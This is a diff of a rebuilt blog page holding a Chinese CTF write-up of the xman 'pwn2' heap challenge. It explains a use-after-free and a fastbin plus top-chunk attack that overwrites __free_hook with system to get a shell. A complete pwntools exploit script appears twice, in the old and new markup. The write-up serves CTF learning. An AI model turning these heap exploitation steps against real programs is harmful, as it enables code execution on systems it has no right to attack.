@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="xman夏令营 pwn2​    xman堆系列的最后一题，不得不说xman培训的pwn题质量是真的高，4道题，基本上涵盖了所有的堆利用方式。">
@@ -31,7 +31,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2018-08-27T00:37:40.000Z">
 <meta property="article:modified_time" content="2020-07-06T02:08:50.317Z">
-<meta property="article:author" content="xdw">
+<meta property="article:author" content="XDW">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -144,29 +144,9 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
 
   </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
-
-  </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -204,7 +184,9 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xdw</p>
+    <img class="site-author-image" itemprop="image" alt="XDW"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">XDW</p>
   <div class="site-description" itemprop="description">一枚很菜但是仍在学习的二进制菜逼</div>
 </div>
 <div class="site-state-wrap animated">
@@ -218,7 +200,6 @@
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-          
         <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
@@ -232,6 +213,16 @@
 </div>
 
 
+  <div class="links-of-blogroll animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ixuchao.cn/" title="https:&#x2F;&#x2F;blog.ixuchao.cn&#x2F;" rel="noopener" target="_blank">Archerx's Blog</a>
+        </li>
+    </ul>
+  </div>
 
       </section>
     </div>
@@ -264,8 +255,8 @@
     <link itemprop="mainEntityOfPage" href="https://driverxdw.github.io/2018/08/27/xman_pwn2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xdw">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="XDW">
       <meta itemprop="description" content="一枚很菜但是仍在学习的二进制菜逼">
     </span>
 
@@ -308,6 +299,13 @@
     </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -317,11 +315,11 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <html><head></head><body><h2 id="xman夏令营-pwn2"><a href="#xman夏令营-pwn2" class="headerlink" title="xman夏令营 pwn2"></a>xman夏令营 pwn2</h2><p>​    xman堆系列的最后一题，不得不说xman培训的pwn题质量是真的高，4道题，基本上涵盖了所有的堆利用方式。<br>    <a id="more"></a><br>    这道题可以说还是很骚的，拿到题目先扔进ida看，看到地址是相对文件的偏移就知道开了pie，接着看函数，选单程序pwn多了，拿到题目先看4个函数，增删改查，一般先看增，看他的chunk list是如何存储的，或者有哪些其它的功能，这里就是一个很正常的分配堆快的功能，比较骚的地方是，他会检测用户的输入，一旦用户输入了libc段的地址，程序就会输出一个类似有黑客攻击的信息，然后把你创建的堆快内容全部清零，这样的话你就不能直接构造来写<strong>malloc_hook和</strong>free_hook了，而且程序本身又开了pie，不能写got表，无法得到text段加载地址，什么东西都无法写入，如何构造system去get shell，乍看之下此题竟然无解。<br>    虽然一开始体验很不好，但是漏洞还是要找的，继续往下看，看完add去看dele，dele是最容易出问题的地方，大概看了一下就发现dele中没有将chunk list中已经delete过的置null，存在一个uaf(use after free)漏洞。然而有什么用呢？利用这个漏洞我们可以改写free chunk的metadata部分，最终达到一个任意地址写的效果，然而，如果要直接写<strong>malloc_hook或者</strong>free_hook的话还是不行，程序不允许输入libc段地址，那该如何去做。<br>    一开始没有想出来，去看了下edit函数，是正常的edit，看了一下保护，发现居然没开canary，于是找程序看有没有可以fake chunk的地方，说不定可以通过泄露libc.environ然后在栈上构造fake chunk，最后用house_of_spirit完成利用。然而遗憾的是并没有发现程序有这样的功能可以在栈上构造fake chunk，而且栈上现有的chunk size无法满足fast bin的检查，很僵。<br>    继续想，<strong>malloc_hook和</strong>free_hook还是要写的，不然根本无法完成利用，那如何写，程序不让你直接写，那能否间接写呢？emmmmm，发现可以利用top chunk attack，这个利用方式不涉及直接写libc，metadata也只是size，构造的话一般不会出现libc段的size。<br>    那就利用top chunk attack来写<strong>free_hook，首先需要泄露libc地址，这个用unsorted bin直接就可以泄露，接着有个小难点，如何写top chunk size，这里用的是fastbin attack写，毕竟fd指向chunk，而且检查相对unsortedd bin比较简单。构造两个fastbin大小的chunk，由于利用top chunk attack需要泄露top chunk的地址，所以先后free掉两个fastbin chunk，之后就可以leak heap地址了，然后计算下偏移得到top chunk的ptr；接着利用fastbin attack，在top chunk ptr-0x10的位置malloc chunk，这里要绕过size检查，恰好这个size就在前两个构造的fastbin chunk中，edit一下贴着top chunk的chunk，将最后8个字节改成一个稍大点size，同时满足和前两个chunk在同一个fastbin中，这里前两个chunk我分配的是0x60字节，那么这里的size需要是0x70(加上header部分)，这样就能malloc chunk了，之后改top chunk size，设修改的大小为为y，修改之后重新add的chunk大小为x，则想要写</strong>free_got为system必须满足top_ptr+x=free_hook-0x10,y-x-0x10=system，很容易就能得到x为free_hook-top_ptr-0x10,y为system+free_hook-top_ptr,edit一下将free_hook改成system，之后可以在堆上创一个/bin/sh字符串，这样deleti一下就能getshell了。<br>    不得不提的是这道题除了之前说的几个难点外还有几个坑点，比较重要的就是top chunk的pre_inuse位这里是为1的，很多人可能为了满足size的条件忽略了这个标志位，若这边p标志位为0的话其实是无法利用的(骚的一批)，所以这里的<strong>free_hook最后其实是syltem+1,试了一下其它的包括y+2,一直到y+8都是可以get shel的(神奇的操作)。<br>    还有就是有个tricks，</strong>malloc_hook一般来说用one_gadget写，<strong>free_hook直接用system写，不过这道题的one_gadget写</strong>malloc__hook死活没有成功哈哈也是很僵硬。留下很多坑，以后再填吧。</p>
+        <h2 id="xman夏令营-pwn2"><a href="#xman夏令营-pwn2" class="headerlink" title="xman夏令营 pwn2"></a>xman夏令营 pwn2</h2><p>​    xman堆系列的最后一题，不得不说xman培训的pwn题质量是真的高，4道题，基本上涵盖了所有的堆利用方式。<br>    <a id="more"></a><br>    这道题可以说还是很骚的，拿到题目先扔进ida看，看到地址是相对文件的偏移就知道开了pie，接着看函数，选单程序pwn多了，拿到题目先看4个函数，增删改查，一般先看增，看他的chunk list是如何存储的，或者有哪些其它的功能，这里就是一个很正常的分配堆快的功能，比较骚的地方是，他会检测用户的输入，一旦用户输入了libc段的地址，程序就会输出一个类似有黑客攻击的信息，然后把你创建的堆快内容全部清零，这样的话你就不能直接构造来写<strong>malloc_hook和</strong>free_hook了，而且程序本身又开了pie，不能写got表，无法得到text段加载地址，什么东西都无法写入，如何构造system去get shell，乍看之下此题竟然无解。<br>    虽然一开始体验很不好，但是漏洞还是要找的，继续往下看，看完add去看dele，dele是最容易出问题的地方，大概看了一下就发现dele中没有将chunk list中已经delete过的置null，存在一个uaf(use after free)漏洞。然而有什么用呢？利用这个漏洞我们可以改写free chunk的metadata部分，最终达到一个任意地址写的效果，然而，如果要直接写<strong>malloc_hook或者</strong>free_hook的话还是不行，程序不允许输入libc段地址，那该如何去做。<br>    一开始没有想出来，去看了下edit函数，是正常的edit，看了一下保护，发现居然没开canary，于是找程序看有没有可以fake chunk的地方，说不定可以通过泄露libc.environ然后在栈上构造fake chunk，最后用house_of_spirit完成利用。然而遗憾的是并没有发现程序有这样的功能可以在栈上构造fake chunk，而且栈上现有的chunk size无法满足fast bin的检查，很僵。<br>    继续想，<strong>malloc_hook和</strong>free_hook还是要写的，不然根本无法完成利用，那如何写，程序不让你直接写，那能否间接写呢？emmmmm，发现可以利用top chunk attack，这个利用方式不涉及直接写libc，metadata也只是size，构造的话一般不会出现libc段的size。<br>    那就利用top chunk attack来写<strong>free_hook，首先需要泄露libc地址，这个用unsorted bin直接就可以泄露，接着有个小难点，如何写top chunk size，这里用的是fastbin attack写，毕竟fd指向chunk，而且检查相对unsortedd bin比较简单。构造两个fastbin大小的chunk，由于利用top chunk attack需要泄露top chunk的地址，所以先后free掉两个fastbin chunk，之后就可以leak heap地址了，然后计算下偏移得到top chunk的ptr；接着利用fastbin attack，在top chunk ptr-0x10的位置malloc chunk，这里要绕过size检查，恰好这个size就在前两个构造的fastbin chunk中，edit一下贴着top chunk的chunk，将最后8个字节改成一个稍大点size，同时满足和前两个chunk在同一个fastbin中，这里前两个chunk我分配的是0x60字节，那么这里的size需要是0x70(加上header部分)，这样就能malloc chunk了，之后改top chunk size，设修改的大小为为y，修改之后重新add的chunk大小为x，则想要写</strong>free_got为system必须满足top_ptr+x=free_hook-0x10,y-x-0x10=system，很容易就能得到x为free_hook-top_ptr-0x10,y为system+free_hook-top_ptr,edit一下将free_hook改成system，之后可以在堆上创一个/bin/sh字符串，这样deleti一下就能getshell了。<br>    不得不提的是这道题除了之前说的几个难点外还有几个坑点，比较重要的就是top chunk的pre_inuse位这里是为1的，很多人可能为了满足size的条件忽略了这个标志位，若这边p标志位为0的话其实是无法利用的(骚的一批)，所以这里的<strong>free_hook最后其实是syltem+1,试了一下其它的包括y+2,一直到y+8都是可以get shel的(神奇的操作)。<br>    还有就是有个tricks，</strong>malloc_hook一般来说用one_gadget写，<strong>free_hook直接用system写，不过这道题的one_gadget写</strong>malloc__hook死活没有成功哈哈也是很僵硬。留下很多坑，以后再填吧。</p>
 <p>exp如下：</p>
-<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-comment">#context(log_level='debug',arch='amd64',os='linux')</span></span><br><span class="line">p=process(<span class="hljs-string">'./pwn2'</span>)</span><br><span class="line">elf=ELF(<span class="hljs-string">'./pwn2'</span>)</span><br><span class="line">libc=ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="hljs-comment">#gdb.attach(p)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="hljs-string">'choice >> '</span>)</span><br><span class="line">	p.sendline(<span class="hljs-string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="hljs-string">'Please enter the length of the note:\n'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="hljs-string">'Please enter the data of the note:\n'</span>)</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="hljs-string">'choice >> '</span>)</span><br><span class="line">	p.sendline(<span class="hljs-string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="hljs-string">'Please enter the index of the note:\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="hljs-string">'choice >> '</span>)</span><br><span class="line">	p.sendline(<span class="hljs-string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="hljs-string">'Please enter the index of the note:\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="hljs-string">'Please enter the data of the note:\n'</span>)</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="hljs-string">'choice >> '</span>)</span><br><span class="line">	p.sendline(<span class="hljs-string">'4'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>*<span class="hljs-string">'a'</span>)</span><br><span class="line">add(<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>*<span class="hljs-string">'b'</span>)</span><br><span class="line">dele(<span class="hljs-number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="hljs-string">'note index 0 : '</span>)</span><br><span class="line">main_arena_88=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<span class="hljs-number">-0x58</span></span><br><span class="line">libc_base=main_arena_88-libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]<span class="hljs-number">-0x10</span></span><br><span class="line">log.info(<span class="hljs-string">'libc_base > '</span>+hex(libc_base))</span><br><span class="line">one_gadget=<span class="hljs-number">0xf02a4</span>+libc_base</span><br><span class="line">one_gadget=<span class="hljs-number">0xf1147</span>+libc_base</span><br><span class="line">one_gadget=<span class="hljs-number">0x45216</span>+libc_base</span><br><span class="line">malloc_hook=libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]+libc_base</span><br><span class="line">log.info(<span class="hljs-string">'malloc_hook > '</span>+hex(malloc_hook))</span><br><span class="line">free_hook=libc.symbols[<span class="hljs-string">'__free_hook'</span>]+libc_base</span><br><span class="line">log.info(<span class="hljs-string">'free_hook > '</span>+hex(free_hook))</span><br><span class="line">system_address=libc.symbols[<span class="hljs-string">'system'</span>]+libc_base</span><br><span class="line"><span class="hljs-comment">#one_gadget=libc_base+0xf02a4</span></span><br><span class="line">add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'0000'</span>)</span><br><span class="line">add(<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#3</span></span><br><span class="line">add(<span class="hljs-number">0x60</span>,<span class="hljs-string">'2'</span>*<span class="hljs-number">0x50</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))</span><br><span class="line">dele(<span class="hljs-number">4</span>)</span><br><span class="line">dele(<span class="hljs-number">3</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="hljs-string">'note index 3 : '</span>)</span><br><span class="line">heap_address=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<span class="hljs-number">-0x70</span><span class="hljs-number">-0x90</span><span class="hljs-number">-0x90</span></span><br><span class="line">log.info(<span class="hljs-string">'heap_address > '</span>+hex(heap_address))</span><br><span class="line">edit(<span class="hljs-number">4</span>,p64(heap_address+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x70</span>+<span class="hljs-number">0x60</span>))</span><br><span class="line">add(<span class="hljs-number">0x60</span>,<span class="hljs-string">'/bin/sh'</span>)</span><br><span class="line">add(<span class="hljs-number">0x60</span>,<span class="hljs-string">'2222'</span>)</span><br><span class="line">top_ptr=heap_address+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x70</span>+<span class="hljs-number">0x70</span></span><br><span class="line">log.info(<span class="hljs-string">'top_ptr > '</span>+hex(top_ptr))</span><br><span class="line"><span class="hljs-comment">#top_ptr+x==free_hook/malloc_hook</span></span><br><span class="line"><span class="hljs-comment">#x=free_hook/malloc_hook-top_ptr</span></span><br><span class="line"><span class="hljs-comment">#top_size=system=origin-apply</span></span><br><span class="line"><span class="hljs-comment">#so origin=system+apply=system+free_hook/malloc_hook-top_ptr</span></span><br><span class="line">log.info(<span class="hljs-string">'top_chunk_size > '</span>+hex(system_address+free_hook-top_ptr<span class="hljs-number">-0x1</span>))</span><br><span class="line"><span class="hljs-comment">#add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x1))</span></span><br><span class="line">add(<span class="hljs-number">0x60</span>,p64(<span class="hljs-number">0</span>)+p64(system_address+free_hook-top_ptr<span class="hljs-number">-0x1</span>))</span><br><span class="line">add(free_hook-top_ptr<span class="hljs-number">-0x10</span>,<span class="hljs-string">'\n'</span>)</span><br><span class="line">dele(<span class="hljs-number">5</span>)</span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x9))</span></span><br><span class="line"><span class="hljs-string">add(free_hook-top_ptr-0x10,'\n')</span></span><br><span class="line"><span class="hljs-string">dele(8)</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">add(0x60,p64(0)+p64(system_address+malloc_hook-top_ptr-0x1))</span></span><br><span class="line"><span class="hljs-string">add(malloc_hook-top_ptr-0x10,'\n')</span></span><br><span class="line"><span class="hljs-string">dele(3)</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level='debug',arch='amd64',os='linux')</span></span><br><span class="line">p=process(<span class="string">'./pwn2'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice &gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the length of the note:\n'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the data of the note:\n'</span>)</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice &gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the index of the note:\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice &gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the index of the note:\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the data of the note:\n'</span>)</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice &gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>*<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>*<span class="string">'b'</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'note index 0 : '</span>)</span><br><span class="line">main_arena_88=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x58</span></span><br><span class="line">libc_base=main_arena_88-libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span></span><br><span class="line">log.info(<span class="string">'libc_base &gt; '</span>+hex(libc_base))</span><br><span class="line">one_gadget=<span class="number">0xf02a4</span>+libc_base</span><br><span class="line">one_gadget=<span class="number">0xf1147</span>+libc_base</span><br><span class="line">one_gadget=<span class="number">0x45216</span>+libc_base</span><br><span class="line">malloc_hook=libc.symbols[<span class="string">'__malloc_hook'</span>]+libc_base</span><br><span class="line">log.info(<span class="string">'malloc_hook &gt; '</span>+hex(malloc_hook))</span><br><span class="line">free_hook=libc.symbols[<span class="string">'__free_hook'</span>]+libc_base</span><br><span class="line">log.info(<span class="string">'free_hook &gt; '</span>+hex(free_hook))</span><br><span class="line">system_address=libc.symbols[<span class="string">'system'</span>]+libc_base</span><br><span class="line"><span class="comment">#one_gadget=libc_base+0xf02a4</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0000'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'1'</span>*<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'2'</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'note index 3 : '</span>)</span><br><span class="line">heap_address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x70</span><span class="number">-0x90</span><span class="number">-0x90</span></span><br><span class="line">log.info(<span class="string">'heap_address &gt; '</span>+hex(heap_address))</span><br><span class="line">edit(<span class="number">4</span>,p64(heap_address+<span class="number">0x90</span>+<span class="number">0x90</span>+<span class="number">0x70</span>+<span class="number">0x60</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'2222'</span>)</span><br><span class="line">top_ptr=heap_address+<span class="number">0x90</span>+<span class="number">0x90</span>+<span class="number">0x70</span>+<span class="number">0x70</span></span><br><span class="line">log.info(<span class="string">'top_ptr &gt; '</span>+hex(top_ptr))</span><br><span class="line"><span class="comment">#top_ptr+x==free_hook/malloc_hook</span></span><br><span class="line"><span class="comment">#x=free_hook/malloc_hook-top_ptr</span></span><br><span class="line"><span class="comment">#top_size=system=origin-apply</span></span><br><span class="line"><span class="comment">#so origin=system+apply=system+free_hook/malloc_hook-top_ptr</span></span><br><span class="line">log.info(<span class="string">'top_chunk_size &gt; '</span>+hex(system_address+free_hook-top_ptr<span class="number">-0x1</span>))</span><br><span class="line"><span class="comment">#add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x1))</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>)+p64(system_address+free_hook-top_ptr<span class="number">-0x1</span>))</span><br><span class="line">add(free_hook-top_ptr<span class="number">-0x10</span>,<span class="string">'\n'</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x9))</span></span><br><span class="line"><span class="string">add(free_hook-top_ptr-0x10,'\n')</span></span><br><span class="line"><span class="string">dele(8)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">add(0x60,p64(0)+p64(system_address+malloc_hook-top_ptr-0x1))</span></span><br><span class="line"><span class="string">add(malloc_hook-top_ptr-0x10,'\n')</span></span><br><span class="line"><span class="string">dele(3)</span></span><br><span class="line"><span class="string">'''</span></span><br><span 